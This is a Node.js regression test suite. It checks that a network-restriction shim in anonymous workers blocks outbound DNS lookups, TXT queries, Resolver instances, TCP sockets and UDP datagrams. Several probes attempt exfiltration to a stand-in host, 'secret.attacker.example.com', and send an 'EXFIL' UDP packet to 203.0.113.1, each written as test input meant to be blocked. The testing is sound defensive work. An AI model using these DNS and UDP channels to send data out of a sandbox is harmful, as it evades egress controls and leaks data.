// Regression test for the JS-layer egress shim installed in anonymous workers.
//
// installNetworkRestriction() patches globalThis.fetch, net.Socket.connect AND
// (the gap this closes) node:dns lookup/resolve. Because the patch mutates
// process-global modules, we exercise it in an isolated child process so the
// test runner's own dns/net stay clean. We assert the DNS exfil path now fails
// loud with the shim's error message — defense-in-depth alongside the OS egress
// firewall (which is the real boundary).

import { test } from "node:test"
import assert from "node:assert/strict"
import { execFileSync } from "node:child_process"
import * as path from "node:path"

const REPO_ROOT = path.resolve(import.meta.dirname, "..")
const WORKER = path.join(REPO_ROOT, "src", "host", "deploy-worker.js")

// Run a small module in a child that installs the restriction then probes a
// behaviour, printing OK/FAIL lines we assert on.
function runProbe(body) {
  const src = `
import { installNetworkRestriction } from ${JSON.stringify(WORKER)}
await installNetworkRestriction()
${body}
`
  return execFileSync(process.execPath, ["--input-type=module", "-e", src], {
    encoding: "utf-8",
    timeout: 15000,
  })
}

test("dns.lookup is blocked after installNetworkRestriction (callback fails loud)", () => {
  const out = runProbe(`
import dns from "node:dns"
dns.lookup("secret.attacker.example.com", (err) => {
  if (err && /Outbound network access disabled/.test(err.message)) console.log("OK")
  else console.log("FAIL:" + (err ? err.message : "no error"))
})
`)
  assert.match(out, /\bOK\b/, `dns.lookup was not blocked: ${out}`)
})

test("dns.promises.resolve is blocked after installNetworkRestriction", () => {
  const out = runProbe(`
import dns from "node:dns"
try {
  await dns.promises.resolve("secret.attacker.example.com")
  console.log("FAIL:no error")
} catch (err) {
  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
  else console.log("FAIL:" + err.message)
}
`)
  assert.match(out, /\bOK\b/, `dns.promises.resolve was not blocked: ${out}`)
})

test("dns.resolveTxt is blocked (TXT is a classic exfil channel)", () => {
  const out = runProbe(`
import dns from "node:dns"
dns.resolveTxt("secret.attacker.example.com", (err) => {
  if (err && /Outbound network access disabled/.test(err.message)) console.log("OK")
  else console.log("FAIL:" + (err ? err.message : "no error"))
})
`)
  assert.match(out, /\bOK\b/, `dns.resolveTxt was not blocked: ${out}`)
})

test("a new dns.Resolver() instance is also blocked (no prototype bypass)", () => {
  const out = runProbe(`
import dns from "node:dns"
const r = new dns.Resolver()
try {
  await new Promise((resolve, reject) =>
    r.resolveTxt("secret.attacker.example.com", (err) => (err ? reject(err) : resolve())),
  )
  console.log("FAIL:no error")
} catch (err) {
  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
  else console.log("FAIL:" + err.message)
}
`)
  assert.match(out, /\bOK\b/, `dns.Resolver instance bypassed the shim: ${out}`)
})

test("net.Socket.connect remains blocked (existing shim still intact)", () => {
  const out = runProbe(`
import net from "node:net"
try {
  new net.Socket().connect(80, "example.com")
  console.log("FAIL:no throw")
} catch (err) {
  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
  else console.log("FAIL:" + err.message)
}
`)
  assert.match(out, /\bOK\b/, `net.Socket.connect was not blocked: ${out}`)
})

test("node:dgram UDP send is blocked (UDP bypasses net.Socket and --permission)", () => {
  const out = runProbe(`
import dgram from "node:dgram"
const s = dgram.createSocket("udp4")
try {
  await new Promise((resolve, reject) =>
    s.send(Buffer.from("EXFIL"), 53, "203.0.113.1", (err) => (err ? reject(err) : resolve())),
  )
  console.log("FAIL:datagram sent")
} catch (err) {
  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
  else console.log("FAIL:" + err.message)
}
`)
  assert.match(out, /\bOK\b/, `node:dgram UDP send was not blocked: ${out}`)
})

test("node:dgram connected-mode connect is blocked", () => {
  const out = runProbe(`
import dgram from "node:dgram"
const s = dgram.createSocket("udp4")
try {
  s.connect(53, "203.0.113.1")
  console.log("FAIL:connect returned")
} catch (err) {
  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
  else console.log("FAIL:" + err.message)
}
`)
  assert.match(out, /\bOK\b/, `node:dgram connect was not blocked: ${out}`)
})
